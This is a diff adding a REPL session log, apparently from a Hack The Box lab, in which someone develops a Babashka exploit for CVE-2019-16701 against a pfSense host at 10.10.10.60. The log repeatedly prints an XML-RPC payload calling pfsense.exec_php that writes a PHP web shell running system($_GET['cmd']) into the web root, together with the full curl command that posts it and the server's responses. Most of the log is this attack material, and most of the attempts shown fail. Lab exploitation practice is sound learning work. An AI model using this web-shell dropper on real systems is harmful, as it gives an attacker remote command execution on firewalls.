@@ -1,0 +1,392 @@
+; Jacking in...
+; Connecting using "Babashka" project type.
+; You can make Calva auto-select this.
+;   - See https://calva.io/connect-sequences/
+; 
+; Starting Jack-in Terminal: pushd /home/loki/hak/htb/sense ; bb --nrepl-server 41327 ; popd
+; Using host:port 127.0.0.1:41327 ...
+; Hooking up nREPL sessions ...
+; Connected session: clj
+; TIPS:
+;   - You can edit the contents here. Use it as a REPL if you like.
+;   - `alt+enter` evaluates the current top level form.
+;   - `ctrl+enter` evaluates the current form.
+;   - `alt+up` and `alt+down` traverse up and down the REPL command history
+;      when the cursor is after the last contents at the prompt
+;   - Clojure lines in stack traces are peekable and clickable.
+; Evaluating code from settings: 'calva.autoEvaluateCode.onConnect.clj'
+nil
+clj꞉user꞉>  ; Use `alt+enter` to evaluate
+clj꞉user꞉> 
+; Jack-in done.
+clj꞉user꞉> 
+nil
+clj꞉user꞉> 
+#'user/RHOST
+clj꞉user꞉> 
+"https://"
+nil
+clj꞉user꞉> 
+https://
+nil
+clj꞉user꞉> 
+hello
+nil
+clj꞉user꞉> 
+; java.lang.ClassCastException: java.lang.String cannot be cast to clojure.lang.IFn user /home/loki/hak/htb/sense/scripts/exploits/cve-2019-16701.bb:1:1
+clj꞉user꞉> 
+"https://"
+clj꞉user꞉> 
+"https://"
+clj꞉user꞉> 
+nil
+clj꞉user꞉> 
+"https://10.10.10.60"
+clj꞉user꞉> 
+#'user/RHOST
+clj꞉user꞉> 
+"https://10.10.10.60"
+clj꞉user꞉> 
+; clojure.lang.ExceptionInfo: Could not resolve symbol: PASSWORD user /home/loki/hak/htb/sense/scripts/exploits/cve-2019-16701.bb:2:3
+clj꞉user꞉> 
+#'user/RHOST
+clj꞉user꞉> 
+#'user/PASSWORD
+clj꞉user꞉> 
+#'user/random_string
+clj꞉user꞉> 
+#'user/command
+clj꞉user꞉> 
+#'user/command
+clj꞉user꞉> 
+"<?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pfsense.exec_php</methodName><params><param><value><string>pfsense</string></value></param><param><value><string>exec('echo \\'<pre> <?php $res = system($_GET[\"cmd\"]); echo $res ?> </pre>\\' > /usr/local/www/alkjfdllldsaf.php');</string></value></param></params></methodCall>"
+clj꞉user꞉> 
+; clojure.lang.ExceptionInfo: curl: (60) SSL certificate problem: self-signed certificate
+; More details here: https://curl.se/docs/sslcerts.html
+; 
+; curl failed to verify the legitimacy of the server and therefore could not
+; establish a secure connection to it. To learn more about this situation and
+; how to fix it, please visit the web page mentioned above.
+;  user /home/loki/hak/htb/sense/scripts/exploits/cve-2019-16701.bb:1:1
+clj꞉user꞉> 
+; clojure.lang.ExceptionInfo: curl: (60) SSL certificate problem: self-signed certificate
+; More details here: https://curl.se/docs/sslcerts.html
+; 
+; curl failed to verify the legitimacy of the server and therefore could not
+; establish a secure connection to it. To learn more about this situation and
+; how to fix it, please visit the web page mentioned above.
+;  user /home/loki/hak/htb/sense/scripts/exploits/cve-2019-16701.bb:1:1
+clj꞉user꞉> 
+; clojure.lang.ExceptionInfo: curl: (60) SSL certificate problem: self-signed certificate
+; More details here: https://curl.se/docs/sslcerts.html
+; 
+; curl failed to verify the legitimacy of the server and therefore could not
+; establish a secure connection to it. To learn more about this situation and
+; how to fix it, please visit the web page mentioned above.
+;  user /home/loki/hak/htb/sense/scripts/exploits/cve-2019-16701.bb:1:1
+clj꞉user꞉> 
+; clojure.lang.ExceptionInfo: curl: (60) SSL certificate problem: self-signed certificate
+; More details here: https://curl.se/docs/sslcerts.html
+; 
+; curl failed to verify the legitimacy of the server and therefore could not
+; establish a secure connection to it. To learn more about this situation and
+; how to fix it, please visit the web page mentioned above.
+;  user /home/loki/hak/htb/sense/scripts/exploits/cve-2019-16701.bb:1:1
+clj꞉user꞉> 
+nil
+clj꞉user꞉> 
+nil
+clj꞉user꞉> 
+{:proc #object[java.lang.ProcessImpl 0x7f27c5ca "Process[pid=45717, exitValue=0]"],
+ :exit 0,
+ :in
+ #object[java.lang.ProcessImpl$ProcessPipeOutputStream 0x178bb9b1 "java.lang.ProcessImpl$ProcessPipeOutputStream@178bb9b1"],
+ :out
+ "\nWarning: in_array() expects parameter 2 to be array, null given in /etc/inc/xmlrpc_client.inc on line 265\n\nWarning: Cannot modify header information - headers already sent by (output started at /etc/inc/xmlrpc_client.inc:265) in /etc/inc/xmlrpc_server.inc on line 426\n\nWarning: Cannot modify header information - headers already sent by (output started at /etc/inc/xmlrpc_client.inc:265) in /etc/inc/xmlrpc_server.inc on line 426\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<methodResponse>\n<fault>\n  <value>\n    <struct>\n      <member>\n        <name>faultCode</name>\n        <value><int>7</int></value>\n      </member>\n      <member>\n        <name>faultString</name>\n        <value><string>Invalid request payload: xmlrpc element PRE cannot be child of STRING</string></value>\n      </member>\n    </struct>\n  </value>\n</fault>\n</methodResponse>",
+ :err
+ "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100  1186    0   846  100   340   3989   1603 --:--:-- --:--:-- --:--:--  5620\n",
+ :prev nil,
+ :cmd
+ ["curl"
+  "--insecure"
+  "-X"
+  "POST"
+  "-H"
+  "Content-Type: application/xml"
+  "-d"
+  "<?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pfsense.exec_php</methodName><params><param><value><string>pfsense</string></value></param><param><value><string>exec('echo \\'<pre> <?php $res = system($_GET[\"cmd\"]); echo $res ?> </pre>\\' > /usr/local/www/alkjfdllldsaf.php');</string></value></param></params></methodCall>"
+  "https://10.10.10.60/xmlrpc.php"]}
+
+clj꞉user꞉> 
+#'user/resp
+clj꞉user꞉> 
+{:proc #object[java.lang.ProcessImpl 0x87b17e0 "Process[pid=45745, exitValue=0]"],
+ :exit 0,
+ :in
+ #object[java.lang.ProcessImpl$ProcessPipeOutputStream 0x167d23f5 "java.lang.ProcessImpl$ProcessPipeOutputStream@167d23f5"],
+ :out
+ "\nWarning: in_array() expects parameter 2 to be array, null given in /etc/inc/xmlrpc_client.inc on line 265\n\nWarning: Cannot modify header information - headers already sent by (output started at /etc/inc/xmlrpc_client.inc:265) in /etc/inc/xmlrpc_server.inc on line 426\n\nWarning: Cannot modify header information - headers already sent by (output started at /etc/inc/xmlrpc_client.inc:265) in /etc/inc/xmlrpc_server.inc on line 426\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<methodResponse>\n<fault>\n  <value>\n    <struct>\n      <member>\n        <name>faultCode</name>\n        <value><int>7</int></value>\n      </member>\n      <member>\n        <name>faultString</name>\n        <value><string>Invalid request payload: xmlrpc element PRE cannot be child of STRING</string></value>\n      </member>\n    </struct>\n  </value>\n</fault>\n</methodResponse>",
+ :err
+ "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100  1186    0   846  100   340   4011   1612 --:--:-- --:--:-- --:--:--  5647\n",
+ :prev nil,
+ :cmd
+ ["curl"
+  "--insecure"
+  "-X"
+  "POST"
+  "-H"
+  "Content-Type: application/xml"
+  "-d"
+  "<?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pfsense.exec_php</methodName><params><param><value><string>pfsense</string></value></param><param><value><string>exec('echo \\'<pre> <?php $res = system($_GET[\"cmd\"]); echo $res ?> </pre>\\' > /usr/local/www/alkjfdllldsaf.php');</string></value></param></params></methodCall>"
+  "https://10.10.10.60/xmlrpc.php"]}
+
+clj꞉user꞉> 
+nil
+clj꞉user꞉> 
+{:proc #object[java.lang.ProcessImpl 0x87b17e0 "Process[pid=45745, exitValue=0]"],
+ :exit 0,
+ :in
+ #object[java.lang.ProcessImpl$ProcessPipeOutputStream 0x167d23f5 "java.lang.ProcessImpl$ProcessPipeOutputStream@167d23f5"],
+ :out
+ "\nWarning: in_array() expects parameter 2 to be array, null given in /etc/inc/xmlrpc_client.inc on line 265\n\nWarning: Cannot modify header information - headers already sent by (output started at /etc/inc/xmlrpc_client.inc:265) in /etc/inc/xmlrpc_server.inc on line 426\n\nWarning: Cannot modify header information - headers already sent by (output started at /etc/inc/xmlrpc_client.inc:265) in /etc/inc/xmlrpc_server.inc on line 426\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<methodResponse>\n<fault>\n  <value>\n    <struct>\n      <member>\n        <name>faultCode</name>\n        <value><int>7</int></value>\n      </member>\n      <member>\n        <name>faultString</name>\n        <value><string>Invalid request payload: xmlrpc element PRE cannot be child of STRING</string></value>\n      </member>\n    </struct>\n  </value>\n</fault>\n</methodResponse>",
+ :err
+ "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100  1186    0   846  100   340   4011   1612 --:--:-- --:--:-- --:--:--  5647\n",
+ :prev nil,
+ :cmd
+ ["curl"
+  "--insecure"
+  "-X"
+  "POST"
+  "-H"
+  "Content-Type: application/xml"
+  "-d"
+  "<?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pfsense.exec_php</methodName><params><param><value><string>pfsense</string></value></param><param><value><string>exec('echo \\'<pre> <?php $res = system($_GET[\"cmd\"]); echo $res ?> </pre>\\' > /usr/local/www/alkjfdllldsaf.php');</string></value></param></params></methodCall>"
+  "https://10.10.10.60/xmlrpc.php"]}
+
+clj꞉user꞉> 
+"<?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pfsense.exec_php</methodName><params><param><value><string>pfsense</string></value></param><param><value><string>exec('echo \\'<pre> <?php $res = system($_GET[\"cmd\"]); echo $res ?> </pre>\\' > /usr/local/www/alkjfdllldsaf.php');</string></value></param></params></methodCall>"
+clj꞉user꞉> 
+"<?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pfsense.exec_php</methodName><params><param><value><string>pfsense</string></value></param><param><value><string>exec('echo \\'<pre> <?php $res = system($_GET[\"cmd\"]); echo $res ?> </pre>\\' > /usr/local/www/alkjfdllldsaf.php');</string></value></param></params></methodCall>"
+clj꞉user꞉> 
+"curl --insecure -X POST -H Content-Type application/xml -d <?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pfsense.exec_php</methodName><params><param><value><string>pfsense</string></value></param><param><value><string>exec('echo \\'<pre> <?php $res = system($_GET[\"cmd\"]); echo $res ?> </pre>\\' > /usr/local/www/alkjfdllldsaf.php');</string></value></param></params></methodCall>"
+clj꞉user꞉> 
+#'user/method-call-host_firmware_version
+clj꞉user꞉> 
+"<?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pfsense.host_firmware_version</methodName><params><param><value><string>pfsense</string></value></param></params></methodCall>"
+clj꞉user꞉> 
+#'user/method-call-host_firmware_version
+clj꞉user꞉> 
+; clojure.lang.ExceptionInfo: curl: (60) SSL certificate problem: self-signed certificate
+; More details here: https://curl.se/docs/sslcerts.html
+; 
+; curl failed to verify the legitimacy of the server and therefore could not
+; establish a secure connection to it. To learn more about this situation and
+; how to fix it, please visit the web page mentioned above.
+;  user /home/loki/hak/htb/sense/scripts/exploits/cve-2019-16701.bb:1:1
+clj꞉user꞉> 
+{:status 200,
+ :headers
+ {"expires" "Sun, 26 Nov 2023 22:09:03 GMT",
+  "cache-control" "max-age=180000",
+  "content-length" "384",
+  "content-type" "text/xml; charset=UTF-8",
+  "date" "Fri, 24 Nov 2023 20:09:03 GMT",
+  "server" "lighttpd/1.4.35"},
+ :body
+ "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodResponse>\n<fault>\n  <value>\n    <struct>\n      <member>\n        <name>faultCode</name>\n        <value><int>105</int></value>\n      </member>\n      <member>\n        <name>faultString</name>\n        <value><string>XML error: Invalid document end at line 1</string></value>\n      </member>\n    </struct>\n  </value>\n</fault>\n</methodResponse>",
+ :err "",
+ :process #object[java.lang.ProcessImpl 0x74d02307 "Process[pid=47433, exitValue=0]"],
+ :exit 0}
+clj꞉user꞉> 
+#'user/resp1
+clj꞉user꞉> 
+{:status 200,
+ :headers
+ {"expires" "Sun, 26 Nov 2023 22:09:28 GMT",
+  "cache-control" "max-age=180000",
+  "content-length" "384",
+  "content-type" "text/xml; charset=UTF-8",
+  "date" "Fri, 24 Nov 2023 20:09:28 GMT",
+  "server" "lighttpd/1.4.35"},
+ :body
+ "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodResponse>\n<fault>\n  <value>\n    <struct>\n      <member>\n        <name>faultCode</name>\n        <value><int>105</int></value>\n      </member>\n      <member>\n        <name>faultString</name>\n        <value><string>XML error: Invalid document end at line 1</string></value>\n      </member>\n    </struct>\n  </value>\n</fault>\n</methodResponse>",
+ :err "",
+ :process #object[java.lang.ProcessImpl 0x4867b8ba "Process[pid=47461, exitValue=0]"],
+ :exit 0}
+clj꞉user꞉> 
+#'user/stage-1-resp
+clj꞉user꞉> 
+; clojure.lang.ArityException: Wrong number of args (0) passed to: clojure.lang.PersistentArrayMap user /home/loki/hak/htb/sense/scripts/exploits/cve-2019-16701.bb:1:1
+clj꞉user꞉> 
+{:status 200,
+ :headers
+ {"expires" "Sun, 26 Nov 2023 22:13:30 GMT",
+  "cache-control" "max-age=180000",
+  "content-length" "384",
+  "content-type" "text/xml; charset=UTF-8",
+  "date" "Fri, 24 Nov 2023 20:13:30 GMT",
+  "server" "lighttpd/1.4.35"},
+ :body
+ "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodResponse>\n<fault>\n  <value>\n    <struct>\n      <member>\n        <name>faultCode</name>\n        <value><int>105</int></value>\n      </member>\n      <member>\n        <name>faultString</name>\n        <value><string>XML error: Invalid document end at line 1</string></value>\n      </member>\n    </struct>\n  </value>\n</fault>\n</methodResponse>",
+ :err "",
+ :process #object[java.lang.ProcessImpl 0x2c86859 "Process[pid=47824, exitValue=0]"],
+ :exit 0}
+clj꞉user꞉> 
+{:status 200,
+ :headers
+ {"expires" "Sun, 26 Nov 2023 22:13:30 GMT",
+  "cache-control" "max-age=180000",
+  "content-length" "384",
+  "content-type" "text/xml; charset=UTF-8",
+  "date" "Fri, 24 Nov 2023 20:13:30 GMT",
+  "server" "lighttpd/1.4.35"},
+ :body
+ "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodResponse>\n<fault>\n  <value>\n    <struct>\n      <member>\n        <name>faultCode</name>\n        <value><int>105</int></value>\n      </member>\n      <member>\n        <name>faultString</name>\n        <value><string>XML error: Invalid document end at line 1</string></value>\n      </member>\n    </struct>\n  </value>\n</fault>\n</methodResponse>",
+ :err "",
+ :process #object[java.lang.ProcessImpl 0x2c86859 "Process[pid=47824, exitValue=0]"],
+ :exit 0}
+clj꞉user꞉> 
+"https://10.10.10.60/xmlrpc.php"
+clj꞉user꞉> 
+#'user/stage-1-resp
+clj꞉user꞉> 
+{:status 200,
+ :headers
+ {"expires" "Sun, 26 Nov 2023 22:17:32 GMT",
+  "cache-control" "max-age=180000",
+  "content-length" "384",
+  "content-type" "text/xml; charset=UTF-8",
+  "date" "Fri, 24 Nov 2023 20:17:32 GMT",
+  "server" "lighttpd/1.4.35"},
+ :body
+ "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodResponse>\n<fault>\n  <value>\n    <struct>\n      <member>\n        <name>faultCode</name>\n        <value><int>105</int></value>\n      </member>\n      <member>\n        <name>faultString</name>\n        <value><string>XML error: Invalid document end at line 1</string></value>\n      </member>\n    </struct>\n  </value>\n</fault>\n</methodResponse>",
+ :err "",
+ :process #object[java.lang.ProcessImpl 0xe92041c "Process[pid=48046, exitValue=0]"],
+ :exit 0}
+clj꞉user꞉> 
+; clojure.lang.ExceptionInfo: Could not resolve symbol: method-call_exec_php user /home/loki/hak/htb/sense/scripts/exploits/cve-2019-16701.bb:2:3
+clj꞉user꞉> 
+#'user/random_string
+clj꞉user꞉> 
+#'user/resp2
+clj꞉user꞉> 
+{:status 200,
+ :headers
+ {"expires" "Sun, 26 Nov 2023 22:30:39 GMT",
+  "cache-control" "max-age=180000",
+  "content-length" "384",
+  "content-type" "text/xml; charset=UTF-8",
+  "date" "Fri, 24 Nov 2023 20:30:39 GMT",
+  "server" "lighttpd/1.4.35"},
+ :body
+ "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodResponse>\n<fault>\n  <value>\n    <struct>\n      <member>\n        <name>faultCode</name>\n        <value><int>105</int></value>\n      </member>\n      <member>\n        <name>faultString</name>\n        <value><string>XML error: Invalid document end at line 1</string></value>\n      </member>\n    </struct>\n  </value>\n</fault>\n</methodResponse>",
+ :err "",
+ :process #object[java.lang.ProcessImpl 0x42d6e0f7 "Process[pid=48792, exitValue=0]"],
+ :exit 0}
+clj꞉user꞉> 
+"https://10.10.10.60/xmlrpc.php"
+clj꞉user꞉> 
+#'user/stage-1-resp
+clj꞉user꞉> 
+{:status 200,
+ :headers
+ {"expires" "Sun, 26 Nov 2023 22:32:18 GMT",
+  "cache-control" "max-age=180000",
+  "content-length" "384",
+  "content-type" "text/xml; charset=UTF-8",
+  "date" "Fri, 24 Nov 2023 20:32:18 GMT",
+  "server" "lighttpd/1.4.35"},
+ :body
+ "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodResponse>\n<fault>\n  <value>\n    <struct>\n      <member>\n        <name>faultCode</name>\n        <value><int>105</int></value>\n      </member>\n      <member>\n        <name>faultString</name>\n        <value><string>XML error: Invalid document end at line 1</string></value>\n      </member>\n    </struct>\n  </value>\n</fault>\n</methodResponse>",
+ :err "",
+ :process #object[java.lang.ProcessImpl 0x31f80b54 "Process[pid=48832, exitValue=0]"],
+ :exit 0}
+clj꞉user꞉> 
+"<?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pfsense.host_firmware_version</methodName><params><param><value><string>pfsense</string></value></param></params></methodCall>"
+clj꞉user꞉> 
+; clojure.lang.ExceptionInfo: babashka.curl: status 411 user /home/loki/hak/htb/sense/scripts/exploits/cve-2019-16701.bb:2:3
+clj꞉user꞉> 
+{:status 200,
+ :headers
+ {"expires" "Sun, 26 Nov 2023 22:30:39 GMT",
+  "cache-control" "max-age=180000",
+  "content-length" "384",
+  "content-type" "text/xml; charset=UTF-8",
+  "date" "Fri, 24 Nov 2023 20:30:39 GMT",
+  "server" "lighttpd/1.4.35"},
+ :body
+ "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodResponse>\n<fault>\n  <value>\n    <struct>\n      <member>\n        <name>faultCode</name>\n        <value><int>105</int></value>\n      </member>\n      <member>\n        <name>faultString</name>\n        <value><string>XML error: Invalid document end at line 1</string></value>\n      </member>\n    </struct>\n  </value>\n</fault>\n</methodResponse>",
+ :err "",
+ :process #object[java.lang.ProcessImpl 0x42d6e0f7 "Process[pid=48792, exitValue=0]"],
+ :exit 0}
+clj꞉user꞉> 
+"https://10.10.10.60/alkjfdllldsaf.php"
+clj꞉user꞉> 
+#'user/final
+clj꞉user꞉> 
+; clojure.lang.ExceptionInfo: curl: (60) SSL certificate problem: self-signed certificate
+; More details here: https://curl.se/docs/sslcerts.html
+; 
+; curl failed to verify the legitimacy of the server and therefore could not
+; establish a secure connection to it. To learn more about this situation and
+; how to fix it, please visit the web page mentioned above.
+;  user /home/loki/hak/htb/sense/scripts/exploits/cve-2019-16701.bb:1:12
+clj꞉user꞉> 
+; clojure.lang.ExceptionInfo: babashka.curl: status 404 user /home/loki/hak/htb/sense/scripts/exploits/cve-2019-16701.bb:2:3
+clj꞉user꞉> 
+; clojure.lang.ExceptionInfo: curl: (3) URL using bad/illegal format or missing URL
+;  user /home/loki/hak/htb/sense/scripts/exploits/cve-2019-16701.bb:2:3
+clj꞉user꞉> 
+; clojure.lang.ExceptionInfo: curl: (3) URL using bad/illegal format or missing URL
+;  user /home/loki/hak/htb/sense/scripts/exploits/cve-2019-16701.bb:1:1
+clj꞉user꞉> 
+; clojure.lang.ExceptionInfo: curl: (3) URL using bad/illegal format or missing URL
+;  user /home/loki/hak/htb/sense/scripts/exploits/cve-2019-16701.bb:2:3
+clj꞉user꞉> 
+; clojure.lang.ExceptionInfo: curl: (3) URL using bad/illegal format or missing URL
+;  user /home/loki/hak/htb/sense/scripts/exploits/cve-2019-16701.bb:2:3
+clj꞉user꞉> 
+; java.io.FileNotFoundException: Could not locate clojure/java/codec.bb, clojure/java/codec.clj or clojure/java/codec.cljc on classpath. user /home/loki/hak/htb/sense/scripts/exploits/cve-2019-16701.bb:1:1
+clj꞉user꞉> 
+nil
+clj꞉user꞉> 
+nil
+clj꞉user꞉> 
+nil
+clj꞉user꞉> 
+#'user/RHOST
+clj꞉user꞉> 
+#'user/PASSWORD
+clj꞉user꞉> 
+#'user/stage-1-resp
+clj꞉user꞉> 
+{:status 200,
+ :headers
+ {"expires" "Mon, 27 Nov 2023 16:57:50 GMT",
+  "cache-control" "max-age=180000",
+  "content-length" "384",
+  "content-type" "text/xml; charset=UTF-8",
+  "date" "Sat, 25 Nov 2023 14:57:50 GMT",
+  "server" "lighttpd/1.4.35"},
+ :body
+ "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodResponse>\n<fault>\n  <value>\n    <struct>\n      <member>\n        <name>faultCode</name>\n        <value><int>105</int></value>\n      </member>\n      <member>\n        <name>faultString</name>\n        <value><string>XML error: Invalid document end at line 1</string></value>\n      </member>\n    </struct>\n  </value>\n</fault>\n</methodResponse>",
+ :err "",
+ :process #object[java.lang.ProcessImpl 0x5dabc75d "Process[pid=59436, exitValue=0]"],
+ :exit 0}
+clj꞉user꞉> 
+#'user/stage-1-resp
+clj꞉user꞉> 
+{:status 200,
+ :headers
+ {"expires" "Mon, 27 Nov 2023 17:02:36 GMT",
+  "cache-control" "max-age=180000",
+  "content-length" "384",
+  "content-type" "text/xml; charset=UTF-8",
+  "date" "Sat, 25 Nov 2023 15:02:37 GMT",
+  "server" "lighttpd/1.4.35"},
+ :body
+ "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodResponse>\n<fault>\n  <value>\n    <struct>\n      <member>\n        <name>faultCode</name>\n        <value><int>105</int></value>\n      </member>\n      <member>\n        <name>faultString</name>\n        <value><string>XML error: Invalid document end at line 1</string></value>\n      </member>\n    </struct>\n  </value>\n</fault>\n</methodResponse>",
+ :err "",
+ :process #object[java.lang.ProcessImpl 0x2eb4d25f "Process[pid=59633, exitValue=0]"],
+ :exit 0}
+clj꞉user꞉> 
